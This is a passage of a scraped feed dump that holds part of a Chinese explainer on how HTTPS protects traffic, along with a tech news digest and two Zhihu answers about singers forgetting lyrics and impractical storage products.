src=\"https://cdn.sspai.com/2021/08/03/34f34a82a01afe1f88ebe925cbbc8480.png\"></figure><p>这张证书主要包含以下信息：</p>\n<ol>\n<li>证书颁给了哪个或哪些网站（使用者）</li>\n<li>证书的有效期的起止时间（有效期）</li>\n<li>一个公钥</li>\n<li>证书是由谁颁发的（颁发者）</li>\n</ol>\n<p>接下来，你会一一对这些信息进行处理。</p>\n<p>第一项很好理解，<strong>使用者</strong>，就是这张证书对谁有效。你看了一眼，嗯，<code>*.sspai.com</code>，这是一个通配符域名，意思就是对所有 <code>sspai.com</code> 的域名都有效。好的，它确实符合少数派网站的网址，验证通过。</p>\n<p>第二项，<strong>有效期</strong>，也很容易。你在自己的电脑上查了一下时间，2021 年 8 月，确实是在有效期区间内，好的，验证通过。</p>\n<p>第三项是一个 <strong>公钥</strong>，先存下来后面用。</p>\n<p>第四项，<strong>颁发者</strong>，虽然你知道了这张证书是由一个叫做 RapidSSL TLS DV RSA Mixed SHA256 2020 CA-1 的人颁发的。<strong>但这个人又是谁，他值得信任吗？</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/492cddf0a9355444b8152178829cc0da.png\"></figure><p>这就要看证书中的最后一项内容，证书路径。在这里，我们可以通过一个树形图，清晰地看到我们当前这个证书的信任链。对于列表中的每一项，都可以通过右下方「查看证书」按钮，读取到这一项的证书信息。</p>\n<p>也就是说，列表中的每一项其实都是一张完整的证书。在这个例子中：</p>\n<ul>\n<li>RapidSSL TLS DV RSA Mixed SHA256 2020 CA-1 保证了 <code>*.sspai.com</code> 的证书是可信任的</li>\n<li>DigiCert 保证了 RapidSSL TLS DV RSA Mixed SHA256 2020 CA-1 的证书是可信任的</li>\n<li>浏览器，或者操作系统，充分信任 DigiCert（浏览器或操作系统会维护一个受信任的列表）</li>\n</ul>\n<p>因此，随着一层层的信任关系你也就信任了 <code>*.sspai.com</code> 这张证书；这种信任带来的最重要的意义在于——你相信，证书中包含的那个「公钥」确实是属于少数派的，而不是其中任何一个邮差伪造的。</p>\n<p>所以，证书带来的结果就是：<strong>你拥有了一个确信是少数派的公钥</strong>。</p>\n<h2>HTTPS 的初次加密尝试</h2>\n<p>公钥就像是从证书这个文件袋中捎过来的一个信封，一旦封口，就只有证书拥有者使用私钥才可以打开；换言之，你只要用这个信封寄送，那么就只有少数派可以读到（啊，用于封口的是 <strong>一种神奇的胶水</strong>，这是由数学原理保证的）。</p>\n<p>你可以放心地使用从证书中找到的这枚公钥。如果你决定试一下，便可以生成一个随机数 36721，写在明信片上，然后兴致勃勃地把明信片装进信封，仔细地封好口子。</p>\n<blockquote><p>【这是只有你和少数派才可以看到的内容】</p></blockquote>\n<p>现在，你交给邮局的不再是体无遮拦的明信片，而是一个信封。邮差看不到信件的内容，他只知道这封信送往何处；少数派成功收到了这封信，并使用少数派的私钥拆开了信封。最后一个随机数成功送达。</p>\n<p>整理一下。结合前面的「问候」过程，现在你和少数派双方手上拥有：</p>\n<ol>\n<li>一个双方都认可的加密算法 TLS_RSA_WITH_AES_256_GCM_SHA384，邮差可以偷看</li>\n<li>一个少数派生成的随机数 785391，邮差可以偷看</li>\n<li>一个你生成的随机数 11872，邮差可以偷看</li>\n<li>另一个你生成的随机数 36721，只有你和少数派知道</li>\n</ol>\n<p>通过这些信息，你和少数派会各自使用三个随机数和算法，计算出一个称为「会话密钥」的密码。由于随机数和算法都已经确定，因此你和少数派计算出的「会话密钥」必然是一致的；假设这个计算出来的密码是 1627638。</p>\n<p>你们事实上完成了一件很有意思的事情：<strong>在所有聊天内容都会被人偷看的情况下，你们成功交换了密码</strong>。这使得后续的秘密聊天成为可能。交换密钥的方法也还有很多，这里仅仅展示了其中的一种。</p>\n<h2>愉快的秘密通信</h2>\n<p>好了，最后，你们可以使用前面制作的 1627638 这个密码来进行后面的聊天。</p>\n<p>这个密码用起来就方便多了，只要双方通过 <strong>一个带密码锁的小盒子</strong> 来互相通信，那路上的邮差就肯定打不开。</p>\n<p>暴力解锁？密码复杂度保证了即使用人类最顶级的计算机，也无法在有生之年把密码猜出来。（1627638 这只是个例子，实际使用当然不可能这么短小）</p>\n<p>你把想问的问题（我的私信？）塞进了密码锁，并把密码锁的密码设为 1627638，锁上之后打乱密码锁。</p>\n<p>少数派拿到了这个密码锁，通过 1627638 解开密码锁。同样的，少数派会把你的私信内容也用 1627638 锁上，寄回给你。</p>\n<p>最后，你还是用 1627638 解锁私信内容，秘密通信顺利完成。</p>\n<p>再来回头看看最开始 HTTP 遇到几个风险，在 HTTPS 中是如何解决的：</p>\n<ol>\n<li>\n<strong>邮差知道了你的私信内容、姓名和密码</strong>：在 HTTPS 中，由于通信使用 1627638 这个密码锁来加密，所以路上的邮差不可能知道信件的内容</li>\n<li>\n<strong>无法确定到底是不是少数派给出的答复</strong>：在 HTTPS 中，证书的信任链保证了「公钥」的可信度，而公钥和私钥的匹配认证了少数派的身份</li>\n<li>\n<strong>捣蛋的邮递员修改了信件内容</strong>：在 HTTPS 中，由于使用了密码锁，邮差读不了邮件，也无法写入信件</li>\n</ol>\n<p>所以通过这稍显复杂的 HTTPS 通道，我们最终解决了 HTTP 的一些风险。</p>\n<h2>HTTPS 已随处可见</h2>\n<p>现在几乎所有主流的浏览器都已经用比较强烈的视觉效果区分了 HTTP 和 HTTPS 网站，例如 Google Chrome，访问少数派网站时，地址栏前方的标识是一把寓示着安全的小锁，点开则提示「连接是安全的」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/b6d13889b6b1933cae058061e7e26338.png\"></figure><p>而如果访问一个使用 HTTP 的网站，则会直接显示「不安全」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/ed0360a129d8c4b01439c8daa7d425db.png\"></figure><p>当访问的网站，虽然正常完成了「问候」的过程，但是从服务器取到的证书存在或多或少的问题时，浏览器会阻断你们之间的通信：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/40bf7e670427883405e511c445609228.png\"></figure><p>即使通过「高级」按钮底下的选项坚持访问，浏览器依然会时刻把「不安全」标注为醒目的红色：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/75ea64bcca8b1c4b71f0801d0b3307c8.png\"></figure><p>这样激进的措施曾经饱受争议，但是浏览器这样的强制性的行为却带来了非常好的结果。时至今天，我们已经很少见到有哪个网站还只支持 HTTP 访问，也很少见到证书错误的情况。以至于当我们说起互联网的时候，我们已经很难想象，当年那样几乎完全基于 HTTP 的通信是多么不可靠、不安全。</p>\n<h2>还有几个问题值得讨论</h2>\n<h3><strong>为什么一定要有「会话密钥」，直接使用公私钥对来通信不好吗？</strong></h3>\n<p>确实，为了交换一个保险箱密码我们多花了不少精力。而要取得少数派的神奇信封，似乎只要向少数派索取一个证书就可以了。</p>\n<p>但这样做原因很简单：用保险箱上锁，只要打乱密码就可以了，成本低；而神奇信封和用于封口的神奇胶水太贵了。</p>\n<p><strong>术语来讲，前者称为对称加密，后者称为非对称加密。对称加密更加高效。</strong></p>\n<h3><strong>为什么有些软件还是可以读取 HTTPS 内容？</strong></h3>\n<p>我所知的几种方法。</p>\n<p>第一种，你可以直接通过浏览器 F12 的「网络」标签页来读取 HTTPS 内容。这里，浏览器就是通信双方中的一方（也就是上文中的「你」），自然知道所有的加密要素，所以通过浏览器可以读到明文的数据也就不足为奇了；就像你可以知道你发给少数派、少数派发给你的所有信息一样自然。</p>\n<p>第二种，你信任其中一个邮差，告诉了他密码锁的密码；那邮差就可以读信给你听了。</p>\n<p>还有一种，是通过安装私有证书来实现。你信任一个邮差，所以你把邮差的证书加入了自己系统的「受信任列表」；于是：</p>\n<ol>\n<li>你跟邮差之间通信，使用邮差的证书</li>\n<li>邮差收到你的内容，转发给少数派，使用少数派的证书</li>\n<li>邮差收到少数派的内容，用少数派的密码解密</li>\n<li>邮差把少数派的答复转发给你，用与你之间的密码加密</li>\n</ol>\n<p>所以，只要你保护好自己的「受信任列表」，就不用担心 HTTPS 通信被他人偷看，换句话说，<strong>如果有网站让你「添加证书到系统」，为了安全请一定要慎重</strong>。</p>\n<h3><strong>自签名证书安全吗？</strong></h3>\n<p>不安全，自签名证书属于自欺欺人、掩耳盗铃、欲盖弥彰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/c586e5aa6f6e4470d69385598bda3fa4.png\"></figure><p>有些网站会自己签发证书。由于缺少了可靠的证书信任链，客户端无法验证服务端的真实身份，因此信件很容易被路上的邮差调包；如果邮差从最开始的「问候」阶段就开始动坏心思，那么整个通信都可以被邮差控制。</p>\n<p>当使用自签名证书时，几乎所有浏览器都会给出证书出错的提示，需要用户手动确认才可以继续访问。</p>\n<h3><strong>中间人还可以窃听到什么信息？</strong></h3>\n<p>路由器和运营商提供的访问统计、以安全之名实行的网站拦截，亦或是以大数据之名而进行的隐私追踪，这些在 HTTPS 中依然可以做到吗？采取了 HTTPS 通信后，作为路上的邮差，还可以偷看到哪些信息呢？</p>\n<p>自然，加密信件的全部内容都无法获取。这些内容包括：</p>\n<pre class=\"language-null\"><code>GET /message/2hzb91qd HTTP/1.1\nHost: sspai.com\nConnection: keep-alive\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Microsoft Edge\";v=\"92\"\nsec-ch-ua-mobile: ?0\nDNT: 1\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5,ja;q=0.4,sl;q=0.3\nIf-Modified-Since: Wed, 04 Aug 2021 08:54:52 GMT\n\nHTTP/1.1 200 OK\nServer: nginx/1.10.3\nDate: Wed, 04 Aug 2021 08:55:22 GMT\nLast-Modified: Wed, 04 Aug 2021 08:54:52 GMT\nAccess-Control-Allow-Origin: *.sspai.com\nContent-Type: text/html\nVary: Accept-Encoding\nETag: W/\"610a55dc-1121\"\nContent-Encoding: gzip\n\n&lt;!DOCTYPE html&gt;&lt;html lang=en id=html&gt;\n...</code></pre>\n<p>也就是说，包括主机名、请求体、URL路径和参数、返回的头部和消息体，这些都是加密的。而信件的地址，也就是 IP 地址，必然是会被邮差知道，否则邮差不知道把信送到哪儿去。</p>\n<p>唯一的漏网之鱼来自于 SNI（Server Name Indication，服务器名称指示）。客户端向服务端发起请求的时候，会表明自己想要访问的网站。例如，前面的例子中，你向少数派问候时：</p>\n<blockquote><p>我需要访问私信</p></blockquote>\n<p>而少数派则回复：</p>\n<blockquote><p>给你私信网站的证书（一个文件袋）</p></blockquote>\n<p>这是因为，同一台服务器上，可能部署了多个子网站（例如可能私信、文章区分了不同的子域名，但是部署在同一个服务器上），那么就需要客户端指明所需访问的网站，服务器才可以给出合适的证书。</p>\n<p>例如，<code>sspai.com</code> 或者 <code>ditu.baidu.com</code> 这样的域名依然通过「明信片」的形式发送，邮差们可以随意查看。但是， <code>/message/2hzb91qd</code> 这样表明「查看某条私信」的具体操作，则是安全的。</p>\n<p>这也为基于 HTTPS 的网络通信过滤提供了方便。前面所说的访问统计、网站拦截、隐私追踪，很大一部分都是靠的 SNI 这个参数。但是就像前述例子中所述，SNI 仅提供域名，而 URL 地址包含在加密的 HTTP 消息中，因此追踪也相对有限。</p>\n<p>事实上，现在也有技术来保护 SNI 的安全，例如 ESNI 和后来演变成的 ECH 都是非常有效的尝试。</p>\n<h2>你可以做些什么</h2>\n<p>基于前面的讨论，我们可以思考如何更安全地在互联网上浏览。</p>\n<h3><strong>从一开始就使用 HTTPS</strong></h3>\n<p>对于支持 HTTPS 的网站，大部分都对 HTTP 进行了跳转。举例来说，当你访问少数派网站时，如果直接在浏览器中输入 <code>sspai.com</code> 就敲下回车键，那么浏览器会自动跳转到 <code>http://sspai.com</code> 而不是 HTTPS 站点。而少数派网站在收到 HTTP 请求后，会告诉你：我改地址了，请使用 HTTPS 访问。</p>\n<blockquote><p>致少数派：我需要访问首页，这是我的个人信息</p></blockquote>\n<blockquote><p>答复：我换地方了，请使用 https://sspai.com/ 重新访问</p></blockquote>\n<p>于是，你重新发起了一次聊天，这次，你使用了 HTTPS。</p>\n<p>这里有很明显的问题，当你使用 HTTP 访问时，你已经把你需要访问的内容（少数派首页）、你的个人信息，都以「明信片」的形式交给了邮差。虽然少数派提醒了你需要更换地址并拒绝给予任何有实际意义的答复，但是这之前已经稍许泄露了信息。</p>\n<p>所以最好的做法是，当你访问网站时，直接输入： <code>https://sspai.com</code> 而不要偷懒让浏览器自动去跳转。</p>\n<h3>绝对不要信任不可靠的证书</h3>\n<p>这些行为包括：</p>\n<ul>\n<li>有些银行网站，会让你提前安装「网银助手」，其中一步就是「把银行自己的证书安装到系统中」。这其实并不安全。不过现在这样做的银行已经越来越少了。</li>\n<li>遇到证书过期、域名不匹配、信任链存在瑕疵的证书时，浏览器会给予全屏提示。此时虽然有小字可以点击「继续访问」，但是非常不推荐此时继续输入敏感信息。</li>\n</ul>\n<h3>为自己的网站加上 HTTPS</h3>\n<p>如果你拥有自己的个人网站或者博客，那么你一定要配置一下 HTTPS 证书。我经常使用 <a href=\"https://letsencrypt.org/\" target=\"_blank\">Let's Encrypt</a> 提供的免费证书，借助 <a href=\"https://certbot.eff.org/\" target=\"_blank\">Certbot</a> 这个一键配置工具，简单几行命令就可以一劳永逸地配置完成。</p>\n<p>Let's Encrypt 的证书有效期只有三个月，但是 Certbot 提供了自动续期的功能，有效期将近时会自动更新服务器上所有托管的证书。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68040"},{"title":"派早报：摩托罗拉推出 Edge S Pro 和 Edge 轻奢版、Apple 将上报儿童虐待图片等","date":"2021-08-06 01:00:00","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>摩托罗拉推出 Edge S Pro 和 Edge 轻奢版</h3>\n<p>摩托罗拉于 8 月 5 日正式发布两款 Edge 系列新机：Edge S Pro 和 Edge 轻奢版 ，其中 Edge S Pro 定位为旗舰机型，采用高通骁龙 870 处理器，配备 10 亿色超感真彩屏，支持 144Hz 高刷 + SGS 护眼双认证，Turbo UFS3.1+Turbo LPDDR5 存储，相机方面，后置三摄分别为一亿像素的主摄、50 倍的 OIS 潜望变焦以及 121° 超广角，前置为1600万像素居中挖孔，系统上采用了MYUI2.0 系统，升级了moto AI 丽音功能，会议模式 2.0，支持 Ready For 多屏畅联等功能，整机厚度仅为 7.99mm，重 189g，配备了 4520mAh 电池，支持 33W 快充。售价上，6GB + 128GB 版本 2499 元，首发 2399 元；8GB + 128GB 版本 2699 元；8GB + 256GB 版本 2999 元；12GB + 256GB 版本 3299 元。<a href=\"https://www.ithome.com/0/567/520.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/2032ae050d4861ce7c752ff55c2dab20\"><figcaption>图源：摩托罗拉</figcaption></figure><p>Edge 轻奢版搭载高通骁龙 778G 处理器，同样配备了 10 亿色超感真彩屏，支持 144Hz 高刷 + SGS 护眼双认证。相机方面摩托罗拉 Edge 轻奢版配备后置三摄，同样是一亿像素大底主摄，并配备 3 倍无损光学变焦、30 倍数码变焦镜头，以及 121° 超广角镜头。前置 3200 万水光美颜镜头，5 大算法加持。整机厚度为 6.99mm，重量为 163g，配备了 4020mAh 电池，支持 33W 充电与侧边指纹识别，同样搭载 MYUI2.0 系统，拥有应用 6 开、一键出行等多项功能。售价上 8GB + 128GB 版本 2599 元；8GB + 256GB 版本 2899 元。<a href=\"https://www.cnbeta.com/articles/tech/1162523.htm\" target=\"_blank\">来源</a></p>\n<h3>Apple 将上报儿童虐待图片</h3>\n<p>Apple 公司于 8 月 5 日表示，公司将针对儿童安全推出一项新的举措。在保证用户隐私的情况下，针对用户上传至 iCloud 相册和 iMessage 的图片，通过哈希系统对图片检测，和美国国家失踪与受虐儿童中心（以下简称 NCMEC）提供的散列数据库进行比对。只有超过一定阈值后，违法行为才会进行上报，这将在不降低用户隐私安全的情况下来调查潜在的犯罪行为，该系统将会在 iOS 15 更新时正式启动。<a href=\"https://www.theverge.com/2021/8/5/22611721/apple-csam-child-abuse-scanning-hash-system-ncmec\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/25268677d7402049cc7c256dc83477ec\"><figcaption>iMessage 中检测到对应照片以后的提示，图源：Apple</figcaption></figure><h3>小米应用商店完成首批 App 隐私检测</h3>\n<p>8 月 5 日，小米应用商店针对 App 违规收集与使用个人信息等侵害用户权益问题，对首批 3 万款 App 进行隐私检测。截至 7 月 30 日，共发现 1.3 万款存在隐私合规风险的应用，并针对部分应用直接进行下架处理。<a href=\"https://www.sohu.com/a/481614238_116157?scm=1002.590044.0.10052-170\" target=\"_blank\">来源</a></p>\n<h3>OPPO 跨屏互联 Windows 版上线</h3>\n<p>8 月 5 日，OPPO 更新官网信息，正式上线「跨屏互联」的新功能，目前 Windows 用户已可以在官网下载客户端。根据信息显示，电脑需求 Windows 10，并支持 WIFI Direct 即可；手机设备的系统需要为 ColorOS 12 的版本。用户可以通过「跨屏互联」完成文件传输、剪贴板共享、信息同步等功能。<a href=\"https://pc.heytap.com/zh-CN\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/77b231cafef18038ffd0e6ce1b5bebaf\"><figcaption>图源：OPPO</figcaption></figure><h3>AMD 和 Valve 正努力改进驱动程序以提升 Linux 上游戏性能</h3>\n<p>虽然 SteamOS 可以通过兼容层 Proton 运行绝大多数的 Windows 游戏，但是就性能上说远不及 Windows 上原生运行游戏，这主要和 ACPI CPUFreq 驱动导致 CPU 性能扩展不佳有关。而 AMD 和 Valve 已经合作解决了上述问题，通过对一种新的 AMD 平台上的 CPU 性能扩展设计，从而大幅度提升现代 AMD 平台上的性能水平，在 SteamOS 上游玩使用 VKD3D-Proton 技术的 3D 游戏，如 Horizon Zero Dawn，会在未来有更好的每瓦特性能扩展。<a href=\"https://hot.cnbeta.com/articles/game/1162515.htm\" target=\"_blank\">来源</a></p>\n<h3>国家电影局要求控制疫情风险区电影院上座率</h3>\n<p>8 月 5 日，国家电影局网站发布《关于进一步加强当前电影院疫情防控工作》的通知，根据风险等级动态调整情况，按照当地疫情防控部署要求，对电影院进行限流、暂停或是关闭。低风险地区电影院上座率不得高于75%，而中高风险地区电影院暂不开放。<a href=\"http://www.chinafilm.gov.cn/chinafilm/contents/153/3592.shtml\" target=\"_blank\">来源</a></p>\n<h3>《疯狂兔子：奇遇派对》正式上线国行 Switch</h3>\n<p>8 月 5 日， 由 UBISOFT 育碧成都开发的《疯狂兔子：奇遇派对》已同时上线国行 Nintendo Switch e 商店以及天猫京东等网上商城，该游戏为国行 Switch 独占，售价 299 元。<a href=\"https://www.ubisoft.com/zh-cn/help/rabbids-adventure-party/article/000098221\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/63fd5fe207ada96c9d8cc78993d7ac0f\"><figcaption>图源：UBISOFT 中国</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>近期，realme 公布其 MagDart 磁吸充电技术，同时发布 realme GT Flash 概念手机，该设备或将 6.7 英寸 sAMOLED 显示屏，搭载骁龙 888 Plus 处理器。<a href=\"https://twitter.com/yabhishekhd/status/1422875126677131268?s=20\" target=\"_blank\">来源</a>\n</li>\n<li>据 Panos 爆料，Windows 11 中将加入一个名为 Focus Sessions 的新功能，将强化闹钟和时钟的作用。<a href=\"https://www.windowscentral.com/first-look-windows-11s-focus-sessions-feature-here\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒 BusinesssKorea 消息称，台积电已经开始 3nm 制程芯片制造设备，新设备安装工作在台积电 Fab 18 工厂进行，今年内试产明年量产。台积电 3nm 工艺预计将使芯片体积缩小至 5nm 芯片的 70%，同时功耗会下降。未来，苹果、高通、英伟达、AMD 等公司，有望寻求台积电为其代工 3nm 芯片。<a href=\"https://www.ithome.com/0/567/442.htm\" target=\"_blank\">来源</a>\n</li>\n<li>有消息人士称定位低端的 Pixel 5a 将会在本月 26 日正式发布，只在两个市场：美国和日本推出。将配备 6.4 英寸的屏幕，处理器为骁龙 765G，电池容量为 4650mAh，运存为 6GB，相机则和去年的 Pixel 5 基本一致，目前确认支持 IP67 防水防尘并且有一个 3.5mm 的耳机插孔。售价为 450 美元。<a href=\"https://www.androidcentral.com/prosser-google-pixel-5a-coming-august-26th-449?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed:+androidcentral+(Android+Central)\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>😢 原定周末举办的少数派线下活动，因为疫情管控加强，按政策规定，现场人数不得超过 50 人，因此我们按时间顺序通过了前 40 个报名的用户，后续报名用户只能下次参加，我们因此非常抱歉，涉及需要退款用户，我们也在加紧处理中。</li>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员均将获赠该书。</li>\n<li>📷️ 聊聊你最爱的那枚镜头，去 <a href=\"https://sspai.com/bullet/1627633392\" target=\"_blank\">一派</a> 和大家交流一下摄影心得吧。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul>\n<li>💿 Microsoft 365 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">限时促销</a>，下单再送定制鼠标垫。</li>\n<li>⚙️ 工具升值包、付费栏目限时 <a href=\"https://sspai.com/post/67817\" target=\"_blank\">特惠加上新</a>，开启你的暑假充电计划。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68069\" target=\"_blank\">📓 在找适合自己的卡片笔记应用？我的选择思路分享</a></li>\n<li><a href=\"https://sspai.com/post/68035\" target=\"_blank\">👓 线上配镜实践经验谈——以蔡司镜片为例</a></li>\n<li><a href=\"https://sspai.com/post/67997\" target=\"_blank\">🎥 拍摄视频前，你也许需要这份图像配置文件笔记</a></li>\n<li><a href=\"https://sspai.com/post/68115\" target=\"_blank\">🌟 新玩意 073｜少数派的编辑们最近买了啥？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68129"},{"title":"为什么很多歌手都会有演唱会忘词的情况？","date":"2021-08-05 23:08:46","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-1234bd9a9a18f0be39cb530953994f8c_l.jpg?source=8673f162\"><span>张毅非，</span><span>混音|编曲|作曲|也拍照|也愛棒球</span>\n<a href=\"https://www.zhihu.com/question/355806438/answer/894609722\" hidden>阅读原文</a>\n</div>\n<div>\n<p>先说制作人型的歌手（指比较接近一体机型的，周王陶林、李荣浩这类）：</p>\n<p>制作一首歌，从作曲到编曲到录音到混音到母带，需要听至少几千遍，所以制作人显然是对这首歌熟悉到连每一根汗毛在哪里都知道，并且听的目的和歌迷不一样，他们是职责所在，每次听都不是在欣赏，只想挑毛病，越听越痛苦，所以除了录音这一部分会去把注意力放在歌词上之外，其他时候根本就没听歌词（顶多是听个大概，然后想想，这部分这样编或者这样混合不合适）所以当一首歌制作完成后，往往都如释重负，一段时间内都不想听到它，不然就会无休止的想要在某些细节上鬼打墙，这首歌就永远都发行不出来……所以会忘词一点也不意外。</p>\n<p>然后其他全部类型可以一起说（包含写词的、写曲的、只唱的）以个人一点点关于演唱的经验，一方面是想要表达好一首歌，需要对这首歌有一点新鲜感。最完美的状态应当是，非常熟悉，但又能对里面的每一个字、每一个音符由衷的喜欢，有很强烈的演绎这首作品的动力。熟悉程度达不到这个完美状态的时候，会忘词，这不用多说；熟悉程度超过这个的时候，会“皮了”，嘴巴在唱，心里在想今晚要吃什么宵夜，完全是肌肉记忆。但肌肉记忆其实也很危险，一旦卡壳了是回不来的，因为脑子没跟上，而且万一不小心形成错误肌肉记忆（比如跟朋友吃饭喝酒，兴致来了，恶搞了一下自己的一首歌，搞了两三次，闹着玩的，结果下次演唱的时候肌肉记忆起了变化。太过于熟练有时候偶尔也会突然肌肉记忆乱掉，有练过乐器的人或多或少应该都有这样的经验）就会突然忘记这里该怎么唱，一样也会忘词、串词。</p>\n<p>另外，周华健这种歌很多的人，平时演出通常都是唱几首，那往往都是选最知名的几首、或新歌，在这些歌被唱到快吐了之外，还有大量的歌一年唱不了几次（我相信也根本不会去听的）到了个人演唱会就要哭了，背不完啊……这样忘词也是难免的。在没有提词器的时代我记得有人说过周华健演唱会都会在地板上偷写歌词 233</p>\n<p>还有极小概率是突然大脑宕机了……我有过一次，不是自己的歌，是陶喆的《爱，很简单》，当时身为多年的陶喆粉丝，对这首歌熟到不能再熟了，然而音乐一下，也没紧张也没激动，就突然忘了第一句，然后就“哼哼哼嗯嗯嗯嗯~~”的混过去了，从第二句接回来面不改色的唱完，下台后想起来，第一句是“忘了是怎么开始”（真是应景啊……啊就真的忘了怎么开始了咩……）</p>\n<p>所以啊提词器真是相当伟大的发明……可以让歌手不要再为了歌词而苦恼，专心在对歌的演绎上，间接提升了演出的平均品质。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/355806438\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738914"},{"title":"卧室有哪些听着很有道理，但实际用到时效果很糟糕的收纳建议/物品？","date":"2021-08-05 23:08:37","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-5f57cb22dda72ae52a1ac4669c6570ed_l.jpg?source=8673f162\"><span>爱整理的方小白，</span><span>热衷收纳整理/让家变得治愈，分享收纳好物公众号：出圈儿</span>\n<a href=\"https://www.zhihu.com/question/57401740/answer/1960500320\" hidden>阅读原文</a>\n</div>\n<div>\n<p>之前没事就打开电商平台刷个十几分钟，每次刷就种草一堆收纳神器，价格不贵看起来还贼好用，以为买回来就能把家里收拾得妥妥帖帖。</p>\n<p>然而，用了几天才发现它们不光不好用，还变成了麻烦的元凶。可能有的我勉强还在用看，有的已经扔了。</p>\n<p>这些“收纳神器”，详情页文案天花乱坠，收货后秒变鸡肋，强烈拔草！</p>\n<p>今天，我来把这些“收纳神器”整理出来，下次你们再看到它们，请马上略过！</p>\n<p><strong><strong><em>NO.1 双层鞋架</em></strong></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1772a53ed0354b083c38c29cee6ecb80_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d31203e30046b90cefaa52f7af35b6e1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-975721da3d89de13ad9c914811d972b0_720w.jpg?source=8673f162\" alt=\"\"></figure><p>是不是第一次看到这种鞋架的时候觉得非常实用？能放多好几双鞋，解决蜈蚣精的需求？</p>\n<p>然而，这种鞋架看似实用，实际上只适用于尺寸较小的鞋，像高帮鞋或者宽一点的男装鞋根本放不下。</p>\n<p>而且如果你家鞋柜的高度低于 30cm，那就基本上全靠挤才能放得下这玩意儿！当然了，最不方便的还是每次取放鞋子都要来回弄个好几遍才能把鞋子放好…… 对于我们大多数“懒人”来讲，还是乖乖地选择透明抽屉鞋盒更妥当。</p>\n<p><strong><em><strong>NO.2 立式鞋架</strong></em></strong></p>\n<p>你以为是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-93b9651df69eadd39708e18181443065_720w.jpg?source=8673f162\" alt=\"\"></figure><p>实际上是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d8b2a88930b450f727d24664cbacc163_720w.jpg?source=8673f162\" 